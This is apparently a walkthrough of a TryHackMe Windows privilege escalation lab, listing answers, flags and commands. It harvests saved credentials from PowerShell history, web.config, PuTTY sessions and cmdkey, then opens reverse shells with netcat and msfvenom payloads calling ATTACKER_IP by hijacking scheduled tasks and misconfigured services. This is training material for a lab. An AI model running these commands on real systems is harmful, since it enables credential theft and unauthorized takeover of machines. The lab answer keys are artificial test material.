# Windows Privilege Escalation

### Windows Privilege Escalation
- Users that can change system configurations are part of which group? `Administrators`
- The SYSTEM account has more privileges than the Administrator user (aye/nay) `aye`

### Harvesting Passwords from Usual Spots
- A password for the julia.jones user has been left on the Powershell history. What is the password? <br />
Open powershell and run: `type $Env:userprofile\AppData\Roaming\Microsoft\Windows\PowerShell\PSReadline\ConsoleHost_history.txt`<br />
![image](https://github.com/user-attachments/assets/e4b7008f-1c12-4681-9215-9e4f01753be4)<br />
`ZuperCkretPa5z`
- A web server is running on the remote host. Find any interesting password on web.config files associated with IIS. What is the password of the db_admin user? <br />
Run the following command: `type C:\Windows\Microsoft.NET\Framework64\v4.0.30319\Config\web.config | findstr connectionString` <br />
![image](https://github.com/user-attachments/assets/8395e424-e937-47e8-8fa4-85716d494cf9)<br />
`098n0x35skjD3`
- There is a saved password on your Windows credentials. Using cmdkey and runas, spawn a shell for mike.katz and retrieve the flag from his desktop. <br />
![image](https://github.com/user-attachments/assets/f30bfd39-b6fa-430c-ae6d-3f29f573f0e1)<br />
So let's open a terminal with these credentials; run `runas /savecred /user:mike.katz cmd.exe`: and get the flag <br />
![image](https://github.com/user-attachments/assets/a507f4b3-23e7-4ce5-8048-5b235a5f0d18)<br />
`THM{WHAT_IS_MY_PASSWORD}`
- Retrieve the saved password stored in the saved PuTTY session under your profile. What is the password for the thom.smith user? <br />
Run `reg query HKEY_CURRENT_USER\Software\SimonTatham\PuTTY\Sessions\ /f "Proxy" /s`: <br />
![image](https://github.com/user-attachments/assets/ee75771b-193b-4717-a68a-f3d76558bfd0)<br />
`CoolPass2021`

### Other Quick Wins
- What is the taskusr1 flag?<br />
If we run `schtasks /query /tn vulntask /fo list /v`:<br />
![image](https://github.com/user-attachments/assets/3642d6aa-877b-4223-bcad-b22e79dc94af)<br >
we can see the same scheduled file described in this task. So let's just follow the steps. So, set up a netcat listener on your attackbox with `nc -lnvp 4444`. Now modify the scheduled task with the following command: `echo c:\tools\nc64.exe -e cmd.exe 10.10.192.202 4444 > C:\tasks\schtask.bat` (Remember to run this on cmd, not powershell). <br />
Now we can run the task with the following command `schtasks /run /tn vulntask` to spawn a reverse shell: <br />
![image](https://github.com/user-attachments/assets/0726bbbc-3910-4a5a-9361-f3a79b677f5a)<br />
So we can get the flag: <br />
![image](https://github.com/user-attachments/assets/6fd04d11-a13f-4f30-8796-5ff2cb5920c1)<br />


### Abusing Service Misconfigurations
- Get the flag on svcusr1's desktop. <br />
Follow the steps described in the task. So if we run `icacls C:\PROGRA~2\SYSTEM~1\WService.exe`<br />
![image](https://github.com/user-attachments/assets/b90186a0-a524-4236-8518-def13024ddb0)<br />
We can see that the EVERYONE group has modify permissions on this service. This means we can simply overwrite it with any payload of our preference, and the service will execute it with the privileges of the configured user account. <br />
So now let's create a reverse shell using msfvenom: `msfvenom -p windows/x64/shell_reverse_tcp LHOST=ATTACKER_IP LPORT=4445 -f exe-service -o rev-svc.exe`. Now open a web server on the attack box: `python3 -m http.server 8080`. And download it from the windows machine (using powershell): `wget http://ATTACKER_IP:8080/rev-svc.exe -O rev-svc.exe`: <br />
![image](https://github.com/user-attachments/assets/3373ddd3-a9c0-484c-9d44-39b1f871a705)<br />
Once the payload is in the Windows server, we proceed to replace the service executable with our payload. Since we need another user to execute our payload, we'll want to grant full permissions to the Everyone group as well:

      cd C:\PROGRA~2\SYSTEM~1\
      move WService.exe WService.exe.bkp
      move C:\Users\thm-unpriv\Desktop\rev-svc.exe WService.exe
      icacls WService.exe /grant Everyone:F

Now start a reverse listener on the attack box: `nc -lvp 4445`, and execute the service(from cmd): 

    C:\> sc stop windowsscheduler
    C:\> sc start windowsscheduler

![image](https://github.com/user-attachments/assets/33b15ca5-6750-4790-90a7-d5d29603dd76)<br />
`THM{AT_YOUR_SERVICE}`

- Get the flag on svcusr2's desktop.<br />
Following the steps on the task, if we run `sc qc "disk sorter enterprise"`<br />
![image](https://github.com/user-attachments/assets/196bffbe-5b69-4d1d-935c-3552622a13ad)<br />
We can see that the service is unquoted, and also is store inside C:\MyPrograms\. By default, this inherits the permissions of the C:\ directory, which allows any user to create files and folders in it. We can check this using `icacls`.
So again, create a reverse shell with msfvenom `msfvenom -p windows/x64/shell_reverse_tcp LHOST=ATTACKER_IP LPORT=4446 -f exe-service -o rev-svc2.exe` and transfer it to the windows machine. Open a netcat listener `nc -lnvp 4446`. Now on the windows machine(powershell):

      move C:\Users\thm-unpriv\rev-svc2.exe C:\MyPrograms\Disk.exe
      icacls C:\MyPrograms\Disk.exe /grant Everyone:F
And on cmd: 

      sc stop "disk sorter enterprise"
      sc start "disk sorter enterprise"
![image](https://github.com/user-attachments/assets/100489b4-da77-4ee5-b4f5-a8db1a86c427)<br />
`THM{QUOTES_EVERYWHERE}`
      
- Get the flag on the Administrator's desktop. <br />
If we run `accesschk64.exe -qlc thmservice`: <br />
![image](https://github.com/user-attachments/assets/d749c7d0-a0e0-4209-9a00-ceaa7c76a6c0)<br />
Here we can see that the BUILTIN\\Users group has the SERVICE_ALL_ACCESS permission, which means any user can reconfigure the service. So, lets create a payload with msfvenom: `msfvenom -p windows/x64/shell_reverse_tcp LHOST=ATTACKER_IP LPORT=4447 -f exe-service -o rev-svc3.exe`. <br />
Remember to grant permissions to Everyone to execute your payload: `icacls C:\Users\thm-unpriv\rev-svc3.exe /grant Everyone:F`. Now from cmd: `sc config THMService binPath= "C:\Users\thm-unpriv\rev-svc3.exe" obj= LocalSystem`, and, after setting a netcat listener, restart the service to get the flag: `THM{INSECURE_SVC_CONFIG}`

### Abusing dangerous privileges
- Get the flag on the Administrator's desktop.

### Abusing vulnerable software
- Get the flag on the Administrator's desktop.

### 

### 
